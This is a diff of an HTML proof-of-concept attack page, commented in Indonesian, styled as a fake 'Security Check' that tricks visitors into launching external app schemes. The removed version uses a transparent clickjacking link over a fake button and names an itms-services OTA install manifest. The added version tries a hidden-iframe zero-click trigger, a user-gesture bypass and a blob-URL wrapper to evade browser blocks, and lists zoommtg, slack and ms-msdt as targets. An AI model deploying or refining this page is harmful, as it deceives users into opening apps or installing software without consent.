@@ -3,95 +3,96 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Update</title>
+<title>System Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
     background: #f4f6f8;
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    display: flex; justify-content: center; align-items: center;
+    height: 100vh; margin: 0;
   }
-  .panel {
-    background: #fff;
-    padding: 40px;
-    border-radius: 12px;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-    text-align: center;
-    max-width: 400px;
-  }
+  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; }
   h1 { color: #333; margin-bottom: 10px; }
   p { color: #666; margin-bottom: 20px; }
   .fake-btn {
-    background: #007aff;
-    color: #fff;
-    padding: 15px 30px;
-    border-radius: 8px;
-    font-size: 18px;
-    font-weight: bold;
-    display: inline-block;
-    position: relative;
+    background: #007aff; color: #fff; padding: 15px 30px; border-radius: 8px;
+    font-size: 18px; font-weight: bold; cursor: pointer; position: relative;
   }
-  
-  /* Tombol Transparan (Clickjacking) */
-  .trap-link {
-    position: absolute;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    opacity: 0;
-    cursor: pointer;
-  }
+  iframe { display: none; }
 </style>
 </head>
 <body>
 
 <div class="panel">
-  <h1>🔒 FaceTime Security Check</h1>
-  <p>Klik tombol di bawah untuk memverifikasi identitas Anda.</p>
-  
-  <!-- UI PALSU DENGAN LINK CLICKJACKING -->
-  <div class="fake-btn" style="position: relative;">
-    Verify Identity
-    <!-- SKEMA TARGET: Ganti dengan itms-services://, zoommtg://, atau slack:// -->
-    <a href="facetime://security-check@apple.com" class="trap-link"></a>
-  </div>
+  <h1>🔒 Security Check</h1>
+  <p id="status">Memproses...</p>
+  <div class="fake-btn" id="trigger">Verify System</div>
 </div>
 
 <script>
 (function () {
   'use strict';
 
-  console.log("[!] Protocol Handler PoC Loaded.");
-  
+  // Skema target: Ganti dengan zoommtg://, slack://, ms-msdt://
+  var targetScheme = "facetime://security-check@apple.com";
+
+  console.log("[!] Memulai Protocol Bypass...");
+
   // ============================================
-  // ZERO-CLICK TRIGGER (BLOCKED BY MODERN BROWSERS)
+  // 1. ZERO-CLICK ATTEMPT (Diblokir Browser Modern)
   // ============================================
-  // Mencoba memicu skema tanpa klik.
-  // Safari/Chrome modern akan memblokir ini.
   setTimeout(function() {
     try {
-      // Jangan gunakan window.location.href (bisa merusak history)
       var iframe = document.createElement('iframe');
-      iframe.style.display = 'none';
-      iframe.src = 'facetime://security-check@apple.com';
+      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups allow-same-origin";
+      iframe.style.display = "none";
+      
+      // Tulis payload ke dalam iframe
+      iframe.srcdoc = `
+        <script>
+          try {
+            // Paksa navigasi top-level ke skema
+            window.top.location.href = "${targetScheme}";
+          } catch(e) {}
+        <\/script>
+      `;
       document.body.appendChild(iframe);
       console.log("[!] Zero-Click Iframe Trigger sent.");
-    } catch(e) {
-      console.log("Zero-Click Trigger blocked.");
-    }
+    } catch(e) {}
   }, 1000);
 
   // ============================================
-  // NOTE: Untuk itms-services:// (OTA Install)
+  // 2. GESTURE BYPASS (Race Condition pada Klik)
   // ============================================
-  // Untuk menginstal aplikasi iOS secara OTA, skema harus:
-  // itms-services://?action=download-manifest&url=https://domain.com/manifest.plist
-  
-  // Jika target Anda iOS, ganti href di atas menjadi:
-  // <a href="itms-services://?action=download-manifest&url=https://artha231.github.io/manifest.plist" class="trap-link"></a>
+  document.getElementById('trigger').addEventListener('click', function() {
+    document.getElementById('status').innerText = "Membuka aplikasi...";
+
+    // Trik: Gunakan location.replace (tidak meninggalkan history)
+    // Eksekusi dalam microtask (0ms) untuk memanfaatkan Transient Activation
+    queueMicrotask(function() {
+      try {
+        window.location.replace(targetScheme);
+      } catch(e) {
+        console.log("Gesture Bypass gagal:", e);
+      }
+    });
+
+    // Trik Alternatif: Blob Wrapper
+    // (Karena Safari memblokir window.location ke skema eksternal,
+    // kita bungkus dalam blob: URL)
+    try {
+      var payload = `<script>window.location.replace("${targetScheme}");<\/script>`;
+      var blob = new Blob([payload], { type: 'text/html' });
+      var blobUrl = URL.createObjectURL(blob);
+      
+      // Coba panggil via iframe
+      var iframe2 = document.createElement('iframe');
+      iframe2.style.display = 'none';
+      iframe2.src = blobUrl;
+      document.body.appendChild(iframe2);
+    } catch(e) {}
+  });
 
 })();
 </script>
